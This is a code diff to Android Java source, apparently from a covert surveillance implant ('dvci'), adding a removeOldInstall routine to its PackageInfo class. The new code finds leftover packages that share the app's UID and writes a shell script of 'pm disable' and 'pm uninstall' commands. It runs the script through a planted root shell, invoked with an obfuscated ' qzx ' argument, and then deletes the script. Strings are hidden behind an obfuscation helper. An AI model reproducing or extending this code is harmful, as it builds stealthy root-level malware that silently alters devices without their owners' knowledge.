@@ -8,6 +8,8 @@
 package com.android.dvci.capabilities;
 
 import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 
 import com.android.dvci.Root;
 import com.android.dvci.Status;
@@ -30,9 +32,12 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 
 import javax.xml.parsers.FactoryConfigurationError;
 import javax.xml.parsers.ParserConfigurationException;
+
+import com.android.dvci.Root;
 
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
@@ -261,11 +266,68 @@ public class PackageInfo {
 		return false;
 	}
 
+	public static boolean removeOldInstall(String ShellFileBase){
+		int uid= android.os.Process.myUid();
+		String myName= Status.getAppContext().getPackageName();
+		final PackageManager pm = Status.getAppContext().getPackageManager();
+		//get a list of installed apps.
+		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+		List<String> apps = new ArrayList<String>();
+		//loop through the list of installed packages and see if the selected
+		//app is in the list
+		for (ApplicationInfo packageInfo : packages) {
+			if(packageInfo.uid == uid && !packageInfo.packageName.equalsIgnoreCase(myName)){
+				//get the UID for the selected app
+				apps.add(packageInfo.packageName);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (removeOldInstall) found leftover:"+packageInfo.packageName);
+				}
+			}
+		}
+
+		if(!apps.isEmpty()){
+			//forge the script
+			String script = M.e("#!/system/bin/sh")+ "\n";
+			for(String r:apps) {
+				if(ShellFileBase!=null) {
+					script += ShellFileBase+M.e(" qzx ")+ M.e("\"pm disable ") + r + "\"\n" +
+							  ShellFileBase+M.e(" qzx ")+ M.e("\"pm uninstall ") + r + "\"\n";
+				}else{
+					script += M.e("pm disable ") + r + "\n" +
+							M.e("pm uninstall ") + r + "\n";
+				}
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (removeOldInstall): script: " + script); //$NON-NLS-1$
+			}
+
+			if (Root.createScript("o", script) == false) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (removeOldInstall): failed to create script"); //$NON-NLS-1$
+				}
+
+				return false;
+			}
+			Execute ex = new Execute();
+			ex.execute( Status.getAppContext().getFilesDir() + "/o ");
+			Root.removeScript("o");
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (removeOldInstall): old app"); //$NON-NLS-1$
+			}
+			return true;
+		}
+		return false;
+	}
 	public static boolean upgradeRoot() {
 		final AutoFile file = new AutoFile(Configuration.oldShellFileBase);
 
-		if (file.exists() && file.canRead()) {
 
+
+		if (file.exists() && file.canRead()) {
+//check leftover if any
+			removeOldInstall(Configuration.oldShellFileBase);
 			try {
 				ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
 				String stdout = p.getStdout();
